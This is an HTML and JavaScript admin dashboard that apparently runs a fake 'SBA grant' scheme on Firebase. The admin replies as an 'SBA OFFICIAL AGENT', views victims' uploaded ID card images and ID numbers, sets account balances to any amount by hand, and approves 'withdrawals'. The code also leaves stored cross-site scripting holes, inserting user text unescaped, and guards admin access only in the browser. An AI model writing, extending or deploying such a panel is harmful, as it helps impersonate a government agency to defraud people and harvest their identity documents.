<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA MASTER | 2026 COMMAND CENTER</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body { background: #020617; color: #f8fafc; font-family: 'Courier New', Courier, monospace; display: none; }
        .admin-nav { background: #0f172a; padding: 20px; border-bottom: 4px solid #ef4444; text-align: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .section-title { font-size: 11px; font-weight: 800; color: #38bdf8; margin: 30px 0 12px 0; text-transform: uppercase; letter-spacing: 2px; padding-left: 10px; border-left: 4px solid #ef4444; }
        .manual-card { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 20px; }
        .manual-card input { background: #020617; border: 1px solid #38bdf8; color: #38bdf8 !important; margin-bottom: 12px; font-weight: bold; font-family: monospace; width: 100%; padding: 12px; border-radius: 4px; }
        .req-card { background: #ffffff; color: #0f172a; padding: 18px; border-radius: 8px; margin-bottom: 15px; border-left: 8px solid #f59e0b; box-shadow: 0 5px 15px rgba(0,0,0,0.3); font-family: sans-serif; }
        .req-tag { float: right; font-size: 9px; background: #0f172a; color: white; padding: 4px 8px; border-radius: 4px; font-weight: bold; text-transform: uppercase; }
        .img-link { color: #0071bc; font-weight: bold; text-decoration: underline; cursor: pointer; margin-right: 15px; border: 1px solid #0071bc; background: #f0f9ff; padding: 5px 10px; border-radius: 4px; font-size: 11px; margin-top: 10px; display: inline-block; }
        .btn-flex { display: flex; gap: 10px; margin-top: 15px; }
        .btn-approve { background: #10b981; color: white; border: none; flex: 1; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
        .btn-decline { background: #ef4444; color: white; border: none; flex: 1; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
        .user-table { background: #0f172a; border-radius: 8px; border: 1px solid #1e293b; overflow: hidden; }
        .user-row { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #1e293b; transition: 0.2s; cursor: pointer; }
        .user-row:hover { background: #1e293b; }
        .user-bal { font-weight: 900; color: #10b981; font-size: 15px; }
        .reply-input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; margin-top: 10px; font-family: sans-serif; color: #000; box-sizing: border-box; font-size: 14px; }
        .send-btn { background: #00274c; color: white; border: none; padding: 12px; border-radius: 8px; margin-top: 10px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="admin-nav">
        <h1 style="font-size: 14px; color: #ef4444; letter-spacing: 3px;">SBA COMMAND UNIT | CORE V8</h1>
        <p style="font-size: 10px; margin-top: 5px; color: #94a3b8;">AGENT_ACTIVE: <span id="adminEmailDisplay">...</span></p>
    </div>

    <div class="container" style="max-width: 600px; padding: 20px; margin: 0 auto;">
        
        <div class="section-title">Inbound Support Tickets</div>
        <div id="adminChatFeed">
            <p style="text-align:center; font-size:11px; color:#475569;">SCANNING FOR INCOMING TRANSMISSIONS...</p>
        </div>

        <div class="section-title">Manual Ledger Override</div>
        <div class="manual-card">
            <input type="text" id="targetUid" placeholder="TARGET_USER_UID">
            <input type="text" id="manualStatus" placeholder="NEW_STATUS (e.g. APPROVED)">
            <input type="text" id="manualAmt" placeholder="ADJUST_BALANCE (e.g. 5000)">
            <button class="btn-approve" style="width:100%;" onclick="window.manualUpdate()">EXECUTE LEDGER SYNC</button>
        </div>

        <div class="section-title">Live Request Stream</div>
        <div id="requestFeed"></div>

        <div class="section-title">Global User Database</div>
        <div class="user-table" id="userList"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, onSnapshot, doc, updateDoc, getDoc, deleteDoc, addDoc, serverTimestamp, query, orderBy, where } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        const MASTER_ADMIN = "liger4683@gmail.com";

        onAuthStateChanged(auth, (user) => {
            if (user && user.email === MASTER_ADMIN) {
                document.body.style.display = "block";
                document.getElementById('adminEmailDisplay').innerText = user.email.toUpperCase();
            } else {
                window.location.href = "index.html";
            }
        });

        // REPLIED TO USER LOGIC
        window.replyToUser = async (userId, originalMsgId, userName) => {
            const replyBox = document.getElementById(`reply-${originalMsgId}`);
            const text = replyBox.value.trim();
            
            if(!text) return alert("Please type a message first!");

            try {
                // Add the reply to the support collection
                await addDoc(collection(db, "support_tickets"), {
                    userId: userId,
                    message: text,
                    sender: "ADMIN",
                    timestamp: serverTimestamp(),
                    userName: "SBA OFFICIAL AGENT"
                });
                
                // Update user's general status to notify them
                await updateDoc(doc(db, "users", userId), {
                    adminMessage: text,
                    lastAgentReply: serverTimestamp()
                });

                replyBox.value = "";
                alert("REPLY TRANSMITTED TO " + userName.toUpperCase());
            } catch(e) {
                alert("ERROR: " + e.message);
            }
        };

        // Live Chat Listener (Shows user messages)
        onSnapshot(query(collection(db, "support_tickets"), orderBy("timestamp", "desc")), (snapshot) => {
            const feed = document.getElementById('adminChatFeed');
            feed.innerHTML = "";
            snapshot.forEach((docSnap) => {
                const m = docSnap.data();
                if (m.sender === "ADMIN") return; // Don't show admin's own replies in the feed
                
                feed.innerHTML += `
                    <div class="req-card" style="border-left: 8px solid #38bdf8;">
                        <div style="font-size:10px; color:#64748b; font-weight:bold;">FROM: ${m.userName} (${m.userId.substring(0,5)})</div>
                        <div style="margin:8px 0; font-size:13px; line-height:1.4; color:#0f172a;">"${m.message}"</div>
                        <div>
                            <textarea id="reply-${docSnap.id}" class="reply-input" placeholder="Type official response here..."></textarea>
                            <button class="send-btn" onclick="window.replyToUser('${m.userId}', '${docSnap.id}', '${m.userName}')">SEND OFFICIAL REPLY</button>
                        </div>
                    </div>`;
            });
        });

        // ... Rest of your existing Manual Update, Request Feed, and User List logic remains the same ...
        // (I'm keeping your viewImg, manualUpdate, and processReq functions exactly as you had them)

        window.viewImg = (data) => {
            const w = window.open();
            w.document.write(`<body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center;"><img src="${data}" style="max-width:100%; border:5px solid white;"></body>`);
        };

        window.manualUpdate = async () => {
            const uid = document.getElementById('targetUid').value.trim();
            const amtStr = document.getElementById('manualAmt').value.replace(/,/g, '');
            const amt = parseFloat(amtStr) || 0;
            const status = document.getElementById('manualStatus').value.trim();
            if(!uid) return alert("UID REQUIRED");
            try {
                const userRef = doc(db, "users", uid);
                const snap = await getDoc(userRef);
                if(!snap.exists()) return alert("USER NOT FOUND");
                const currentBal = parseFloat(snap.data().balance.toString().replace(/,/g, '')) || 0;
                const newTotal = (currentBal + amt).toLocaleString('en-US', {minimumFractionDigits: 2});
                let updates = { balance: newTotal };
                if(status) updates.status = status;
                await updateDoc(userRef, updates);
                alert("SYNC COMPLETE: Total Balance is now $" + newTotal);
            } catch(e) { alert("ERROR: " + e.message); }
        };

        onSnapshot(collection(db, "requests"), (snapshot) => {
            const feed = document.getElementById('requestFeed');
            feed.innerHTML = "";
            snapshot.forEach((r) => {
                const req = r.data();
                const isKYC = req.type === "KYC_SUBMISSION";
                feed.innerHTML += `
                    <div class="req-card" style="border-left-color: ${isKYC ? '#38bdf8' : '#ef4444'}">
                        <span class="req-tag">${req.type}</span>
                        <div style="font-size:12px;"><b>USER:</b> ${req.userName}</div>
                        ${isKYC ? `
                            <p style="font-size:10px; color:#64748b;">ID: ${req.idType} | ${req.idNumber}</p>
                            <button onclick="window.viewImg('${req.frontImg}')" class="img-link">VIEW FRONT</button>
                            <button onclick="window.viewImg('${req.backImg}')" class="img-link">VIEW BACK</button>
                        ` : `
                             <div style="font-size:22px; color:#ef4444; font-weight:900;">-$${req.amount}</div>
                             <p style="font-size:10px; color:#64748b;">${req.method} | ${req.details}</p>
                        `}
                        <div class="btn-flex">
                            <button class="btn-approve" onclick="window.processReq('${r.id}', '${req.userId}', '${req.amount || 0}', 'approve', '${req.type}')">APPROVE</button>
                            <button class="btn-decline" onclick="window.processReq('${r.id}', '${req.userId}', '0', 'decline', '${req.type}')">DECLINE</button>
                        </div>
                    </div>`;
            });
        });

        window.processReq = async (reqId, userId, amt, action, type) => {
            const userRef = doc(db, "users", userId);
            try {
                if (action === 'approve') {
                    if (type === "WITHDRAWAL") {
                        const snap = await getDoc(userRef);
                        const currentBal = parseFloat(snap.data().balance.toString().replace(/,/g, '')) || 0;
                        const finalBal = (currentBal - parseFloat(amt)).toLocaleString('en-US', {minimumFractionDigits: 2});
                        await updateDoc(userRef, { balance: finalBal, status: "TRANSFER COMPLETED" });
                    } else {
                        await updateDoc(userRef, { status: "IDENTITY VERIFIED", kycStatus: "VERIFIED" });
                    }
                } else {
                    await updateDoc(userRef, { status: "ACTION REQUIRED / DOCS REJECTED" });
                }
                await deleteDoc(doc(db, "requests", reqId));
            } catch(e) { alert("ERROR: " + e.message); }
        };

        onSnapshot(collection(db, "users"), (snapshot) => {
            const list = document.getElementById('userList');
            list.innerHTML = "";
            snapshot.forEach((u) => {
                const data = u.data();
                if(data.email === MASTER_ADMIN) return;
                list.innerHTML += `
                    <div class="user-row" onclick="document.getElementById('targetUid').value='${u.id}'">
                        <div style="font-size:12px;"><b>${data.fullName}</b><br><small>UID: ${u.id.substring(0,8)} | ${data.status}</small></div>
                        <div class="user-bal">$${data.balance}</div>
                    </div>`;
            });
        });
    </script>
</body>
</html>
